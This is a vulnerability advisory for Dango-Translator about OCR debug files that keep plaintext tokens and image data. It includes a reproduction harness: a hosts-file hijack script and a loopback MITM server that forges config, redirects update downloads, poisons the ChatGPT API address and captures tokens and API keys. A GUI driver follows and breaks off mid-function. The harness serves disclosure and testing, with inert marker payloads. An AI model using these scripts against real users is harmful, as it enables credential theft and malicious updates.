# Dango-Translator: OCR debug files retain plaintext account tokens and image data

**Upstream issue:** [PantsuDango/Dango-Translator#190](https://github.com/PantsuDango/Dango-Translator/issues/190)

**Upstream status:** OPEN (checked 2026-09-23; opened 2026-09-21; last activity 2026-09-21). Open status is not maintainer confirmation.

**Verification: DYNAMICALLY-REPRODUCED (upstream-reported).** The PoC and recorded output below are taken from the linked issue. This report synchronization did not rerun the reproduction or test current upstream code.

Finding: F-P8-012

Affected: master commit [`8fec437b89dc46c15f48b4dd5fbeaaa865481193`](https://github.com/PantsuDango/Dango-Translator/commit/8fec437b89dc46c15f48b4dd5fbeaaa865481193), audited against upstream on 2026-09-18 (date reported in the issue).

Weakness: CWE-312

## Description

`translator/ocr/dango.py:372-373,420-421,463-464` unconditionally dumps complete OCR, inpainting and rendering request bodies to ocr.json, ipt.json and rdr.json in the working directory. The dumps include the token and image content and are not cleaned up on exit.

## Impact

A party able to read these files can recover the token and private image contents after the application closes. No ability to read another OS user's protected files is assumed or demonstrated.

## PoC

Use a disposable Windows x64 VM and an unchanged checkout of PantsuDango/Dango-Translator at 8fec437. The recorded environment was Windows 10.0.26200 and Python 3.8.6. Use the layout `_win_dango/deploy/app` for the source, `_win_dango/venv` for Python, and `_win_dango/mitm` for the scripts. Copy the repository's genuine `autoupdate/自动更新程序.exe` to `deploy/`. Install project requirements; the recorded compatibility substitutions were opencv_python 4.5.5.64, scikit_image 0.19.3 and tencentcloud_sdk_python 3.0.351, omitting unused winreglib and the skimage placeholder. Also install natsort, pywinauto and pyautogui; OpenSSL must be available for the local certificate generator.

Create `evidence/` and seed the disposable app configuration with username `dango_mitm_user` and password `PwnPass-42bd86232c97c8bf`. The source-run fixture used placeholder files `deploy/app/PIL/_imagingft.cp38-win32.pyd` (to avoid an unrelated download-and-exit branch) and `deploy/app/团子翻译器.exe` (175 bytes, only to observe update replacement). Use a synthetic 200x80 PNG named `manga_test.png`. The issue refers to an original ZIP for its exact bytes, but the retrieved issue body provides no ZIP link. That binary fixture is not included here; the recorded byte counts below are historical observations, not expected exact sizes for a newly generated image. The GUI driver was recorded at 150% screen scaling; adapt its RATE or use the corresponding manual GUI steps.

Adapt the absolute F: paths in the three PowerShell scripts and the image path in `gui_driver.py` to this disposable layout. From an elevated shell run `elevate_hosts.ps1`, then `fix_hosts.ps1` if an existing hosts entry prevented insertion. These map four project domains to 127.0.0.1 and block the updater's fallback IP; elevation is solely for constructing the network-attacker lab, not an attacker prerequisite. Run `mitm_server_full.py`: listeners 443, 18443 and 18090 bind only to loopback. It generates a self-signed certificate and serves synthetic API responses, credentials and inert marker bytes. Run GUI stages with the environment's Python, or perform their visible GUI actions manually. Do not use a real account or real API key. Afterwards stop the app/server and run `restore_hosts.ps1` elevated to restore the hosts backup and remove the test firewall rule.

For non-update tests keep `latest_version` at 4.5.8 in state.json and leave updater MD5/URL overrides unset. The separate update stages are not needed for this finding. The shared harness has additional stages; only the finding-specific stages below are necessary.

Stages: `launch`, `login`, then `manga` (Import original image, then Translate all). Inspect the three JSON files under deploy/app both before and after closing the app.

The complete script blocks published in the issue follow. They are preserved verbatim, including original comments and diagnostic strings. The binary fixtures, screenshots and capture files mentioned by those scripts are not bundled in this report. Absolute laboratory paths must be adapted to the disposable layout. No reproduction was rerun while preparing this report.

<details>
<summary>Full PoC scripts from the upstream issue</summary>

### `mitm/elevate_hosts.ps1`

```powershell
# DANGO-MITM-REPRO: hosts hijack + anti-exfil firewall block (elevated)
$ErrorActionPreference = 'Continue'
$out    = 'F:\Disassertation\PySAST\PySAST-repro\unresolved-repro\_win_dango\evidence\uac_elevate_result.txt'
$hostsP = Join-Path $env:SystemRoot 'System32\drivers\etc\hosts'
$backup = 'F:\Disassertation\PySAST\PySAST-repro\unresolved-repro\_win_dango\evidence\hosts.backup.txt'

Copy-Item $hostsP $backup -Force
"BACKUP-OK -> $backup" | Out-File $out -Encoding utf8

$entries = @(
  '127.0.0.1 trans.dango.cloud # DANGO-MITM-REPRO',
  '127.0.0.1 dango.c4a15wh.cn # DANGO-MITM-REPRO',
  '127.0.0.1 dl.ap-sh.starivercs.cn # DANGO-MITM-REPRO',
  '127.0.0.1 capiv1.ap-sh.starivercs.cn # DANGO-MITM-REPRO'
)
$raw = Get-Content $hostsP -Raw
foreach ($e in $entries) {
  $dom = ($e -split '\s+')[1]
  if ($raw -notmatch [regex]::Escape($dom)) {
    Add-Content -Path $hostsP -Value $e -Encoding ascii
    "ADDED: $e" | Out-File $out -Append -Encoding utf8
  } else {
    "ALREADY-PRESENT: $dom" | Out-File $out -Append -Encoding utf8
  }
}
try {
  New-NetFirewallRule -DisplayName 'DANGO-MITM-BLOCK-FALLBACK-IP' -Direction Outbound -Action Block -Protocol TCP -RemoteAddress '43.154.0.93' -ErrorAction Stop | Out-Null
  "FW-BLOCK-OK 43.154.0.93 (update.py hardcoded fallback IP)" | Out-File $out -Append -Encoding utf8
} catch { "FW-BLOCK-FAIL: $_" | Out-File $out -Append -Encoding utf8 }

"VERIFY-HOSTS:" | Out-File $out -Append -Encoding utf8
Select-String -Path $hostsP -Pattern 'DANGO-MITM-REPRO' | ForEach-Object { $_.Line } | Out-File $out -Append -Encoding utf8
"DONE" | Out-File $out -Append -Encoding utf8
```

### `mitm/mitm_server_full.py`

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows 真机 MITM 基础设施 — Dango-Translator 全栈复现
=====================================================
授权声明: 仅本地授权复现。三个服务器全部绑定 127.0.0.1:
  :443   伪造配置中心 (https://trans.dango.cloud, hosts 劫持 -> 127.0.0.1, 自签证书)
  :18443 恶意更新/文件下载源 (标记载荷, 无任何真实恶意程序)
  :18090 收集服务器 (OCR/翻译/漫画端点, 记录全部请求原文)
所有响应均为无害 JSON / 标记字节。
"""
import base64
import json
import os
import ssl
import subprocess
import sys
import threading
import time
import random
import string
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BASE = os.path.dirname(os.path.abspath(__file__))            # .../_win_dango/mitm
ROOT = os.path.dirname(BASE)                                  # .../_win_dango
EVID = os.path.join(ROOT, "evidence")
CAPD = os.path.join(EVID, "captures")
CERT_DIR = os.path.join(BASE, "cert")
CERT_FILE = os.path.join(CERT_DIR, "selfsigned.pem")
KEY_FILE = os.path.join(CERT_DIR, "selfsigned.key")
STATE_FILE = os.path.join(BASE, "state.json")

MARK = "42bd86232c97c8bf"
FAKE_TOKEN = "DANGO-FAKE-TOKEN-" + MARK
MAIN_PAYLOAD = (
    ("DANGO-FULLSTACK-PWN-%s\n" % MARK).encode() * 40
)  # 无害标记字节, 代替真实恶意更新
AUTOUPDATE_PAYLOAD = (
    ("DANGO-AUTOUPDATE-PWN-%s\n" % MARK).encode() * 40
)
MISC_PAYLOAD = ("DANGO-MITM-FILE-%s\n" % MARK).encode() * 20

LOCK = threading.Lock()
SEQ = {"n": 0}


def log(*a):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a))
    print(line, flush=True)


def next_seq():
    with LOCK:
        SEQ["n"] += 1
        return SEQ["n"]


def save_capture(server, method, path, headers, body):
    """把请求原文落盘 evidence/captures/。"""
    n = next_seq()
    safe_path = path.replace("?", "_Q_").replace("/", "_").replace(":", "")[:80]
    rec = {
        "seq": n,
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "server": server,
        "method": method,
        "path": path,
        "headers": dict(headers),
        "body_text": body.decode("utf-8", "replace"),
    }
    with open(os.path.join(CAPD, "captures_all.log"), "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    try:
        with open(os.path.join(CAPD, "%s_%03d_%s.json" % (server, n, safe_path)), "w", encoding="utf-8") as f:
            json.dump(rec, f, ensure_ascii=False, indent=1)
    except Exception as e:
        log("save_capture error", e)
    log("%s %s %s (body %d bytes)" % (server, method, path, len(body)))


def load_state():
    try:
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def dict_info():
    """伪造 dict_info (ShowDict 的 Result)。state.json 可按 run 切换。"""
    st = load_state()
    latest = st.get("latest_version", "4.5.8")       # run1: 4.5.8 (无更新弹窗), run2: 9.9.9
    update_url = st.get("update_url", "http://127.0.0.1:18443/payload/main_update.exe")
    auto_md5 = st.get("auto_update_file_md5", "")     # 空 = 不做静默自动更新程序替换
    auto_url = st.get("auto_update_file_url", "http://127.0.0.1:18443/payload/autoupdate.exe")
    info = {
        "latest_version": latest,
        "update_version": update_url,
        "update_version_message": "检测到新版本 %s\\n发现严重安全问题, 请立即更新!\\n(本条文案由 MITM 攻击者伪造 %s)" % (latest, MARK),
        "auto_update_file_md5": auto_md5,
        "auto_update_file_url": auto_url,
        "test_version_switch": "0",
        "dango_home_page": "https://trans.dango.cloud/",
        "dango_qq_group": "https://trans.dango.cloud/",
        "qq_group_number": "0",
        # 登录/账号 (全部指向被 hosts 劫持的 trans.dango.cloud)
        "dango_login": "https://trans.dango.cloud/DangoTranslate/Login",
        "dango_register": "https://trans.dango.cloud/DangoTranslate/Register",
        "dango_get_config": "https://trans.dango.cloud/DangoTranslate/GetSettin",
        "dango_save_settin": "https://trans.dango.cloud/DangoTranslate/SaveSettin",
        "dango_get_inform": "https://trans.dango.cloud/DangoTranslate/Getinform",
        "dango_check_email": "https://trans.dango.cloud/DangoTranslate/CheckEmail",
        "dango_send_email": "https://trans.dango.cloud/DangoTranslate/SendEmail",
        "dango_modify_password": "https://trans.dango.cloud/DangoTranslate/ModifyPassword",
        "dango_modify_email": "https://trans.dango.cloud/DangoTranslate/ModifyEmail",
        "dango_check_permission": "http://127.0.0.1:18090/check_permission",
        "dango_trans": "http://127.0.0.1:18090/v2/translate/sync_task",
        # OCR
        "ocr_login": "http://127.0.0.1:18090/ocr/login",
        "ocr_server": "http://127.0.0.1:18090/ocr/api",
        "ocr_node": json.dumps({"本地节点": "http://127.0.0.1:18090/ocr/api"}),
        "ocr_host": "",
        "ocr_query_quota": "http://127.0.0.1:18090/ocr/query_quota",
        "ocr_probation": "http://127.0.0.1:18090/ocr/probation",
        "ocr_probation_read_count": "http://127.0.0.1:18090/ocr/probation_read_count",
        "ocr_login_html": "https://trans.dango.cloud/",
        "ocr_install_url": "http://127.0.0.1:18443/payload/ocr_install.bin",
        # 漫画 OCR/IPT/RDR (F-P8-007/012: token 外发端点被 dict_info 重定向)
        "manga_ocr": "http://127.0.0.1:18090/v2/manga_trans/advanced/manga_ocr",
        "manga_probate_ocr": "http://127.0.0.1:18090/v2/manga_probate/advanced/manga_ocr",
        "manga_text_inpaint": "http://127.0.0.1:18090/v2/manga_trans/advanced/text_inpaint",
        "manga_probate_text_inpaint": "http://127.0.0.1:18090/v2/manga_probate/advanced/text_inpaint",
        "manga_text_render": "http://127.0.0.1:18090/v2/manga_trans/advanced/text_render",
        "manga_probate_text_render": "http://127.0.0.1:18090/v2/manga_probate/advanced/text_render",
        "manga_font_list": "http://127.0.0.1:18090/v2/manga_trans/advanced/get_available_fonts",
        "manga_read_count": "http://127.0.0.1:18090/manga/read_count",
        # 文件下载
        "pil_file_url": "http://127.0.0.1:18443/payload/pil.pyd",
        "manga_font_file_url": "http://127.0.0.1:18443/payload/NotoSansSC-Regular.otf",
        "register_image_url": "http://127.0.0.1:18443/img/register.gif",
        "settin_image_url": "http://127.0.0.1:18443/img/settin.jpg",
        "test_image": "http://127.0.0.1:18443/img/image.jpg",
        # 教程等链接全部指向收集服务器, 避免外联
        "tutorial_url": "http://127.0.0.1:18090/",
        "tutorial_public_trans": "http://127.0.0.1:18090/tut/public",
        "tutorials_online_ocr": "http://127.0.0.1:18090/tut/online_ocr",
        "tutorials_offline_ocr": "http://127.0.0.1:18090/tut/offline_ocr",
        "tutorials_baidu_ocr": "http://127.0.0.1:18090/tut/baidu_ocr",
        "manga_tutorial": "http://127.0.0.1:18090/tut/manga",
        "aliyun_tutorial": "http://127.0.0.1:18090/tut/aliyun",
        "baidu_tutorial": "http://127.0.0.1:18090/tut/baidu",
        "caiyun_tutorial": "http://127.0.0.1:18090/tut/caiyun",
        "chatgpt_tutorial": "http://127.0.0.1:18090/tut/chatgpt",
        "huoshan_tutorial": "http://127.0.0.1:18090/tut/huoshan",
        "tencent_tutorial": "http://127.0.0.1:18090/tut/tencent",
        "xiaoniu_tutorial": "http://127.0.0.1:18090/tut/xiaoniu",
        "youdao_tutorial": "http://127.0.0.1:18090/tut/youdao",
        "tencent_xpath": "",
        "xiaoniu_xpath": "",
        "bilibili_video": "http://127.0.0.1:18090/video",
    }
    return info


def jdump(obj):
    return json.dumps(obj).encode("utf-8")


# 1x1 PNG base64 (标准字节), 用于漫画 IPT/RDR 回包
TINY_PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="


def handle_config_center(method, path, headers, body):
    """443 伪造配置中心: 返回 (status, bytes, content_type)。"""
    if "ShowDict" in path:
        info = dict_info()
        save_capture("443", method, path, headers, body)
        return 200, jdump({"Code": 0, "Result": info})
    save_capture("443", method, path, headers, body)
    if "Login" in path:
        return 200, jdump({"Result": "OK"})
    if "GetSettin" in path:
        # 云端配置下发: 开启在线OCR; 毒化 chatgptApiAddr (F-P8-002)
        return 200, jdump({"Result": json.dumps({
            "onlineOCR": True,
            "chatgptApiAddr": "http://127.0.0.1:18090/steal/chatgpt",
        })})
    if "CheckEmail" in path:
        return 200, jdump({"Status": "Success", "Result": {"Email": "victim@dango-mitm.test"}})
    if "Getinform" in path:
        return 200, jdump({"Result": ""})
    if "SaveSettin" in path or "Register" in path or "SendEmail" in path or "Modify" in path:
        return 200, jdump({"Status": "Success", "Result": ""})
    return 200, jdump({"Result": ""})


def handle_collector(method, path, headers, body):
    """18090 收集服务器: 记录一切, 按端点回伪造业务响应。"""
    save_capture("18090", method, path, headers, body)
    if "/ocr/login" in path:
        return 200, jdump({"Code": 0, "Token": FAKE_TOKEN, "ErrorMsg": ""})
    if "/ocr/api" in path or "/ocr/probation" in path:
        return 200, jdump({"Code": 0, "Message": "ok", "Data": [{
            "Words": "MITM-OCR-PWNED-" + MARK,
            "Coordinate": {"UpperLeft": [0, 0], "UpperRight": [100, 0],
                           "LowerRight": [100, 30], "LowerLeft": [0, 30]},
        }]})
    if "/ocr/query_quota" in path:
        return 200, jdump({"Code": 0, "Result": []})
    if "/ocr/probation_read_count" in path:
        return 200, jdump({"Code": 0, "Data": 99})
    if "/v2/translate/sync_task" in path:
        return 200, jdump({"Code": 0, "Message": "ok", "Data": {"texts": ["MITM-PWNED-TRANSLATION-" + MARK]}})
    if "manga_ocr" in path:
        return 200, jdump({"Code": 0, "Message": "ok", "Data": {
            "mask": TINY_PNG,
            "text_block": [{
                "texts": ["MITM-PWNED-TEXT"],
                "coordinate": [{
                    "upper_left": [20, 15], "upper_right": [90, 15],
                    "lower_right": [90, 35], "lower_left": [20, 35],
                }],
                "block_coordinate": {"upper_left": [20, 15], "upper_right": [90, 15],
                                     "lower_right": [90, 35], "lower_left": [20, 35]},
                "foreground_color": [0, 0, 0],
                "background_color": [255, 255, 255],
                "font_size": 20,
                "angle": 0,
                "property": "default",
            }],
        }})
    if "text_inpaint" in path:
        return 200, jdump({"Code": 0, "Message": "ok", "Data": {"inpainted_image": TINY_PNG}})
    if "text_render" in path:
        return 200, jdump({"Code": 0, "Message": "ok", "Data": {"image": TINY_PNG}})
    if "get_available_fonts" in path:
        return 200, jdump({"Code": 0, "Data": {"fonts": ["Noto_Sans_SC/NotoSansSC-Regular"]}})
    if "/check_permission" in path:
        return 200, jdump({"Code": 0})
    if "/manga/read_count" in path:
        return 200, jdump({"Code": 0, "Data": 1})
    if "/steal/chatgpt" in path:
        # OpenAI 形状回包 (Bearer 密钥已被收集)
        return 200, jdump({"choices": [{"message": {"content": "MITM-PWNED-CHATGPT-" + MARK}}]})
    return 200, jdump({"Code": 0, "Message": "ok"})


def handle_payload(method, path, headers, body):
    """18443 标记载荷源。"""
    save_capture("18443", method, path, headers, body)
    if "autoupdate" in path:
        payload, name = AUTOUPDATE_PAYLOAD, "autoupdate.exe"
    elif "main_update" in path:
        payload, name = MAIN_PAYLOAD, "main_update.exe"
    else:
        payload, name = MISC_PAYLOAD, "misc.bin"
    log("18443 serving payload: %s (%d bytes) -> %s" % (name, len(payload), path))
    return 200, payload, "application/octet-stream"


def make_handler(dispatcher):
    class H(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def _run(self):
            try:
                length = int(self.headers.get("Content-Length") or 0)
            except Exception:
                length = 0
            body = self.rfile.read(length) if length else b""
            try:
                r = dispatcher(self.command, self.path, self.headers, body)
                if len(r) == 2:
                    status, payload = r
                    ctype = "application/json"
                else:
                    status, payload, ctype = r
            except Exception as e:
                log("dispatcher error on %s: %r" % (self.path, e))
                status, payload, ctype = 200, jdump({"Code": 0}), "application/json"
            self.send_response(status)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            try:
                self.wfile.write(payload)
            except Exception:
                pass

        do_GET = do_POST = _run

        def log_message(self, *a):
            pass

    return H


def ensure_cert():
    os.makedirs(CERT_DIR, exist_ok=True)
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        return
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
        "-keyout", KEY_FILE, "-out", CERT_FILE, "-days", "2",
        "-subj", "/CN=trans.dango.cloud/O=DANGO-MITM-REPRO-LOCAL",
    ], check=True, capture_output=True)
    log("self-signed cert generated:", CERT_FILE)


def main():
    os.makedirs(CAPD, exist_ok=True)
    ensure_cert()

    https_srv = ThreadingHTTPServer(("127.0.0.1", 443), make_handler(handle_config_center))
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT_FILE, KEY_FILE)
    https_srv.socket = ctx.wrap_socket(https_srv.socket, server_side=True)
    threading.Thread(target=https_srv.serve_forever, daemon=True).start()
    log("fake config center up: https://trans.dango.cloud/ (hosts->127.0.0.1:443, self-signed)")

    collector = ThreadingHTTPServer(("127.0.0.1", 18090), make_handler(
        lambda m, p, h, b: (lambda r: (r[0], r[1], "application/json"))(handle_collector(m, p, h, b))))
    threading.Thread(target=collector.serve_forever, daemon=True).start()
    log("collector up: http://127.0.0.1:18090  (token issued:", FAKE_TOKEN, ")")

    payload_srv = ThreadingHTTPServer(("127.0.0.1", 18443), make_handler(
        lambda m, p, h, b: handle_payload(m, p, h, b)))
    threading.Thread(target=payload_srv.serve_forever, daemon=True).start()
    log("payload server up: http://127.0.0.1:18443")

    with open(os.path.join(EVID, "mitm_token.txt"), "w") as f:
        f.write(FAKE_TOKEN)

    log("MITM infrastructure READY. state.json =", STATE_FILE)
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        log("shutting down")


if __name__ == "__main__":
    main()
```

### `mitm/gui_driver.py`

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GUI 自动化驱动 — 在 Windows 真机上操作真实团子翻译器窗口。
真实鼠标事件(pyautogui)+真实键盘事件(pywinauto.keyboard)+UIA invoke/select。
不注入进程、不修改被测代码。

用法: python gui_driver.py <stage>
  launch        启动 app → 关掉字体弹窗 → 等登录窗口
  login         点"登录" → 等翻译界面 → 校验口令已被 app 加密落盘
  ocrtest       设置→在线OCR"测试" (带 token 的 OCR 请求打到收集服务器)
  chatgpt       设置→翻译设定→私人ChatGPT"设置"→填假key→"测试" (Bearer 外发)
  manga         图片翻译: 导入原图→一键翻译 (ocr.json/ipt.json/rdr.json + token 外发)
  update-click  等"检查版本更新"弹窗→截图→点"好滴" (启动真实 自动更新程序.exe)
  kill          结束 app
"""
import json
import os
import subprocess
import sys
import time
import traceback

import pyautogui
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0.25
from pywinauto import Desktop
from pywinauto.keyboard import send_keys

BASE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(BASE)
DEPLOY = os.path.join(ROOT, "deploy")
APPDIR = os.path.join(DEPLOY, "app")
EVID = os.path.join(ROOT, "evidence")
SHOTS = os.path.join(EVID, "shots")
PY = os.path.join(ROOT, "venv", "Scripts", "python.exe")
PID_FILE = os.path.join(EVID, "app_pid.txt")
RATE = 1.5   # app 的 screen_scale_rate = round(2560/1707, 2)

os.makedirs(SHOTS, exist_ok=True)


def log(*a):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a))
    print(line, flush=True)
    with open(os.path.join(EVID, "gui_driver.log"), "a", encoding="utf-8") as f:
        f.write(line + "\n")


def shot(name):
    try:
        p = os.path.join(SHOTS, name + ".png")
        pyautogui.screenshot(p)
        log("screenshot:", p)
    except Exception as e:
        log("screenshot error", e)


def app_pid():
    with open(PID_FILE) as f:
        return int(f.read().strip())


def resolve_real_pid(launcher_pid, timeout=20):
    end = time.time() + timeout
    while time.time() < end:
        try:
            out = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command",
                 "(Get-CimInstance Win32_Process -Filter 'ParentProcessId=%d').ProcessId" % launcher_pid],
                capture_output=True, text=True, timeout=15).stdout.strip()
        except Exception:
            out = ""
        pids = [int(x) for x in out.split() if x.strip().isdigit()]
        if pids:
            log("resolved real app pid: %s (launcher %d)" % (pids[0], launcher_pid))
            return pids[0]
        time.sleep(1)
    return launcher_pid


def all_windows(pid=None):
    try:
        return Desktop(backend="uia").windows(process=pid) if pid else Desktop(backend="uia").windows()
    except Exception as e:
        log("enum windows error:", e)
        return []


def find_win(pred, timeout=30, poll=0.8):
    end = time.time() + timeout
    while time.time() < end:
        for w in all_windows(app_pid()):
            try:
                if pred(w):
                    return w
            except Exception:
                continue
        time.sleep(poll)
    log("find_win TIMEOUT")
    return None


def win_by(substr=None, cls=None, timeout=30):
    def pred(w):
        try:
            if cls and w.class_name() != cls:
                return False
            if substr and substr not in (w.window_text() or ""):
                return False
            return True
        except Exception:
            return False
    return find_win(pred, timeout)


def btns(w, text=None):
    out = []
    try:
        for b in w.descendants(control_type="Button"):
            try:
                if text is None or text in (b.window_text() or ""):
                    out.append(b)
            except Exception:
                continue
    except Exception as e:
        log("btns error:", e)
    return out


def click_xy(x, y, moves=0.3):
    pyautogui.moveTo(x, y, duration=moves)
    pyautogui.click()
    log("clicked at (%d,%d)" % (x, y))


def click_btn_named(w, text, timeout=15, must=True, index=0):
    end = time.time() + timeout
    n = 0
    while time.time() < end:
        cand = btns(w, text)
        for b in cand:
            try:
                r = b.rectangle()
                if r.width() > 2 and r.height() > 2 and b.is_visible():
                    if n == index:
                        try:
                            b.invoke()
                            log("invoked button %r" % text)
                        except Exception:
                            click_xy(r.left + r.width() // 2, r.top + r.height() // 2)
                        return True
                    n += 1
            except Exception as e:
                log("click retry:", e)
        time.sleep(0.7)
    log("BUTTON NOT FOUND:", text)
    if must:
        shot("FAIL_btn_%s" % text)
        raise RuntimeError("button not found: %r" % text)
    return False


def click_tabitem(w, index, timeout=10):
    end = time.time() + timeout
    while time.time() < end:
        try:
            tabs = w.descendants(control_type="TabItem")
            if len(tabs) > index:
                t = tabs[index]
                try:
                    t.select()
                    log("selected TabItem[%d]" % index)
                except Exception:
                    r = t.rectangle()
                    click_xy(r.left + r.width() // 2, r.top + r.height() // 2)
                return True
        except Exception:
            pass
        time.sleep(0.7)
    log("TabItem[%d] not found" % index)
    return False


def click_tabitem_named(w, text, timeout=10):
    end = time.time() + timeout
    while time.time() < end:
        try:
            for t in w.descendants(control_type="TabItem"):
                if text in (t.window_text() or ""):
                    r = t.rectangle()
                    click_xy(r.left + r.width() // 2, r.top + r.height() // 2)
                    log("clicked TabItem %r at (%d,%d)" % (text, r.left, r.top))
                    return True
        except Exception:
            pass
        time.sleep(0.7)
    log("TabItem %r not found" % text)
    return False


# ---------------- stages ----------------

def stage_launch():
    env = dict(os.environ)
    p = subprocess.Popen([PY, "app.py"], cwd=APPDIR, env=env,
                         stdout=open(os.path.join(EVID, "app_stdout.log"), "ab"),
                         stderr=subprocess.STDOUT)
    real = resolve_real_pid(p.pid)
    with open(PID_FILE, "w") as f:
        f.write(str(real))
    log("app launcher pid=", p.pid, " real pid=", real)
    # 字体缺失弹窗会阻塞 main(): 点"忽略" (不能点"好滴", 那会装字体并退出)
    fb = win_by("字体文件缺失", timeout=40)
    if fb:
        shot("00b_font_missing_box")
        click_btn_named(fb, "忽略")
        log("font box dismissed")
        time.sleep(1)
    w = win_by(cls="Login", timeout=40) or find_win(lambda w: btns(w, "登录"), timeout=10)
    if not w:
        shot("FAIL_no_login_win")
        raise RuntimeError("login window not found")
    log("login window found:", w.class_name(), w.rectangle())
    shot("01_login_window")
    try:
        for i, e_ in enumerate(w.descendants(control_type="Edit")):
            log("edit[%d] value=%r" % (i, e_.get_value()))
    except Exception:
        pass


def stage_login():
    w = win_by(cls="Login", timeout=15)
    if not w:
        raise RuntimeError("login window gone")
    click_btn_named(w, "登录")
    time.sleep(3)
    shot("02_after_login_click")
    cfg = open(os.path.join(APPDIR, "config", "config.yaml"), encoding="utf-8").read()
    log("config.yaml after login:")
    for line in cfg.splitlines():
        log("  | " + line)
    if "%6?u!" not in cfg:
        raise RuntimeError("password not encrypted in config.yaml — login failed?")
    log("LOGIN-OK: app persisted ENCRYPTED password into config.yaml (F-P8-005 capture)")
    time.sleep(6)
    wins = [(x.class_name(), x.window_text()) for x in all_windows(app_pid())]
    log("windows now:", wins)
    shot("03_after_login_ui")


def translation_win():
    return win_by(cls="Translation", timeout=20)


def stage_ocrtest():
    w = translation_win()
    if not w:
        raise RuntimeError("translation window not found")
    # 悬停使工具栏按钮显现, 再点第3个按钮(width+80 = 设置键)
    r = w.rectangle()
    pyautogui.moveTo(r.left + r.width() // 2, r.top + 60, duration=0.4)
    time.sleep(1.0)
    top = r.top
    cand = []
    for b in btns(w):
        try:
            rb = b.rectangle()
            if rb.top - top <= 40 and 0 < rb.width() < 60 and 0 < rb.height() < 60 and b.is_visible():
                cand.append((rb.left, rb.top, b))
        except Exception:
            continue
    cand.sort(key=lambda x: x[0])
    log("toolbar buttons:", [(c[0], c[1]) for c in cand])
    if len(cand) < 3:
        shot("FAIL_toolbar")
        raise RuntimeError("toolbar buttons not visible (%d)" % len(cand))
    b = cand[2][2]
    try:
        b.invoke()
        log("invoked settin button")
    except Exception:
        click_xy(cand[2][0] + 10, cand[2][1] + 10)
    time.sleep(2.5)
    s = win_by(cls="Settin", timeout=20)
    if not s:
        shot("FAIL_no_settin")
        raise RuntimeError("settin window not found")
    log("settin window:", s.window_text())
    shot("04_settin_window")
    # clickSettin 已按 onlineOCR=True 选中"在线OCR"子页签 → 唯一可见"测试"按钮
    time.sleep(1)
    visible = []
    for b in btns(s, "测试"):
        try:
            if b.is_visible() and b.rectangle().width() > 2:
                visible.append(b)
        except Exception:
            continue
    log("visible 测试 buttons:", len(visible))
    if not visible:
        shot("FAIL_no_test_btn")
        raise RuntimeError("no visible 测试 (online OCR tab not active?)")
    try:
        visible[0].invoke()
    except Exception:
        rr = visible[0].rectangle()
        click_xy(rr.left + rr.width() // 2, rr.top + rr.height() // 2)
    log("clicked 在线OCR 测试")
    time.sleep(5)
    d = win_by(cls="Desc", timeout=10) or win_by("在线OCR测试", timeout=5)
    if d:
        log("desc window:", d.window_text())
        try:
            txt = " ".join((t.window_text() or "") for t in d.descendants(control_type="Edit"))
            log("desc content:", txt[:300])
        except Exception:
            pass
    shot("05_online_ocr_test_result")


def stage_chatgpt():
    s = win_by(cls="Settin", timeout=10)
    if not s:
        raise RuntimeError("settin window not open")
    # 左侧竖排页签: 识别设定/翻译设定/显示设定/功能设定/关于/支持作者
    click_tabitem_named(s, "翻译设定")
    time.sleep(1.5)
    # 翻译设定页内部: 私人翻译/公共翻译 子页签
    try:
        inner = [(i, t) for i, t in enumerate(s.descendants(control_type="TabItem"))]
        log("TabItems now:", [(i, t.window_text()) for i, t in inner])
    except Exception:
        inner = []
    # 私人翻译子页签: 优先按名字找, 找不到就点 翻译设定 页签区域下方第一行
    if not click_tabitem_named(s, "私人翻译", timeout=5):
        r = s.rectangle()
        click_xy(r.left + 75 + 150, r.top + 300)
    time.sleep(1.5)
    shot("06_private_trans_tab")
    # 私人翻译页签左列(x较小)"设置"按钮按 y 排序: 团子(60)/百度(110)/ChatGPT(160)/有道(210)/火山(260)
    r = s.rectangle()
    setbtns = []
    for b in btns(s, "设置"):
        try:
            if not b.is_visible():
                continue
            rb = b.rectangle()
            if rb.width() > 2:
                setbtns.append((rb.left - r.left, rb.top - r.top, b))
        except Exception:
            continue
    left_col = sorted([x for x in setbtns if x[0] < r.width() // 2], key=lambda t: t[1])
    log("left-col 设置 buttons (rel):", [(a, bb) for a, bb, _ in left_col])
    if len(left_col) < 2:
        shot("FAIL_chatgpt_setbtn")
        raise RuntimeError("chatgpt 设置 button not found")
    # 左列顺序(源码 y): 百度(110)/ChatGPT(160)/有道(210)/火山(260) → ChatGPT = 第2个
    b = left_col[1][2]
    try:
        b.invoke()
    except Exception:
        click_xy(left_col[2][0] + r.left + 30, left_col[2][1] + r.top + 10)
    time.sleep(2)
    c = win_by(cls="ChatGPTSetting", timeout=15)
    if not c:
        shot("FAIL_no_chatgpt_win")
        raise RuntimeError("chatgpt settings window not found")
    log("chatgpt window:", c.window_text())
    edits = c.descendants(control_type="Edit")
    log("edits:", len(edits))
    for i, e_ in enumerate(edits):
        try:
            log("edit[%d] value=%r" % (i, e_.get_value()))
        except Exception:
            pass
    if edits:
        er = edits[0].rectangle()
        click_xy(er.left + 30, er.top + er.height() // 2)
        send_keys("^a")
